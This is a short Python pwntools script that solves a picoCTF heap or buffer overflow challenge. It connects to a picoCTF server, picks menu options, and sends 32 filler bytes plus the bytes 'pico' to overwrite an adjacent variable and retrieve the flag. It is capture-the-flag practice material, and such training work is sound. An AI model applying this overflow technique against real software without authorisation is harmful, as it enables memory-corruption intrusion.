from pwn import *

# r = process('./chall')
HOST, PORT = "tethys.picoctf.net 61257".split()
r = remote(HOST, PORT)

r.recvuntil(b': ')
r.sendline(b'2')
r.recvuntil(b': ')
r.sendline(b'A' * 32 + b'\x70\x69\x63\x6f')
r.sendline(b'4')
r.recvuntil(b'YOU WIN\n')

flag = r.recvline().decode().strip()
print(flag)

r.interactive()